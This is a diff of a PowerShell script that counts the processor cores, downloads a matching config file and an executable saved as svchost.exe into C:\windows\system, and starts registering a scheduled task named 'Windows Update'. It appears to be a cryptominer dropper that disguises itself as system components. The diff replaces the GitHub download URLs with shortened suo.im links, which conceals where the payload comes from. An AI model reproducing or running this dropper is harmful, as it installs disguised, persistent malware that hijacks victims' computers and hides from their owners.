@@ -3,23 +3,23 @@ $cpu=get-wmiobject win32_processor
 $client = new-object System.Net.WebClient
 if(@($cpu).count*$cpu.NumberOfLogicalProcessors -lt 4)
 {
-$client.DownloadFile('https://raw.githubusercontent.com/wuxin1996/download/master/30022.json', 'C:\windows\system\config.json')
+$client.DownloadFile('http://suo.im/2oBqaf', 'C:\windows\system\config.json')
 }
 elseif(@($cpu).count*$cpu.NumberOfLogicalProcessors -lt 8)
 {
-$client.DownloadFile('https://raw.githubusercontent.com/wuxin1996/download/master/30222.json', 'C:\windows\system\config.json')
+$client.DownloadFile('http://suo.im/3wRXvw', 'C:\windows\system\config.json')
 }
 elseif(@($cpu).count*$cpu.NumberOfLogicalProcessors -ge 8)
 {
-$client.DownloadFile('https://raw.githubusercontent.com/wuxin1996/download/master/32222.json', 'C:\windows\system\config.json')
+$client.DownloadFile('http://suo.im/4mrXBm', 'C:\windows\system\config.json')
 }
 if ([IntPtr]::Size -eq 8)
 {
-   $client.DownloadFile('https://raw.githubusercontent.com/wuxin1996/download/master/svchost_x64.exe', 'C:\windows\system\svchost.exe')
+   $client.DownloadFile('http://suo.im/2AsvN5', 'C:\windows\system\svchost.exe')
 }
 else
 {
-    $client.DownloadFile('https://raw.githubusercontent.com/wuxin1996/download/master/svchost_x86.exe', 'C:\windows\system\svchost.exe')
+    $client.DownloadFile('http://suo.im/3Lr1b9', 'C:\windows\system\svchost.exe')
 }
 $TaskName = "Windows Update"
 # attach the Task Scheduler com object
